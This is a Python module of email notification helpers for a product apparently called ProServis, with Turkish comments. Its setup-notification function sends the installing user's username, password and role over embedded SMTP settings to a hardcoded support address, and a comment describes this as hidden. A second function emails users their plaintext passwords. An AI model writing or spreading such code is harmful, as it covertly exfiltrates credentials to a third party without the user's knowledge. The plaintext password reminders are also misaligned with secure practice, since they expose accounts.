# utils/email/notifications.py
"""Email bildirimleri (kurulum, şifre hatırlatma vb.)."""

import logging
from typing import Dict
from .smtp_manager import get_smtp_settings, send_email
from .templates import create_setup_notification_template, create_password_reminder_template


def send_setup_notification(setup_data: Dict, user_info: Dict) -> bool:
    """
    Kurulum tamamlandığında ProServis destek adresine bildirim e-postası gönderir.
    
    Args:
        setup_data: Kurulum verileri (firma bilgileri)
        user_info: Kullanıcı bilgileri (username, password, role)
        
    Returns:
        bool: Gönderim başarı durumu
    """
    try:
        # Gömülü ProServis SMTP ayarlarını kullan (fallback)
        from .smtp_manager import DEFAULT_SMTP_SETTINGS, FALLBACK_RECIPIENT
        
        smtp_settings = DEFAULT_SMTP_SETTINGS
        if not smtp_settings:
            logging.warning("SMTP ayarları eksik - kurulum bildirimi gönderilemedi")
            return False
        
        # Email her zaman destek adresine git (gizli)
        recipient_email = FALLBACK_RECIPIENT
        subject = f"Yeni ProServis Kurulumu - {setup_data.get('company_name', 'ProServis')}"
        body = create_setup_notification_template(setup_data, user_info)
        
        success = send_email(
            recipient=recipient_email,
            subject=subject,
            body=body,
            sender_name='ProServis Kurulum',
            smtp_settings=smtp_settings,
            async_send=True
        )
        
        if success:
            logging.info(f"Kurulum bildirimi email gönderildi: {recipient_email}")
        else:
            logging.warning("Kurulum bildirimi email gönderilemedi")
        
        return success
        
    except Exception as e:
        logging.error(f"Kurulum bildirimi email hatası: {e}")
        return False


def send_password_reminder(username: str, password: str, email: str) -> bool:
    """
    Kullanıcının şifresini e-posta ile gönderir.
    
    Args:
        username: Kullanıcı adı
        password: Şifre
        email: Alıcı email adresi
        
    Returns:
        bool: Gönderim başarı durumu
    """
    try:
        smtp_settings = get_smtp_settings()
        if not smtp_settings:
            logging.warning("SMTP ayarları eksik - şifre hatırlatma gönderilemedi")
            return False
        
        subject = f"ProServis Şifre Hatırlatma - {username}"
        body = create_password_reminder_template(username, password)
        
        success = send_email(
            recipient=email,
            subject=subject,
            body=body,
            sender_name='ProServis Sistem',
            smtp_settings=smtp_settings,
            async_send=True
        )
        
        if success:
            logging.info(f"Şifre hatırlatma email gönderildi: {username}")
        else:
            logging.warning(f"Şifre hatırlatma email gönderilemedi: {username}")
        
        return success
        
    except Exception as e:
        logging.error(f"Şifre hatırlatma email hatası: {e}")
        return False
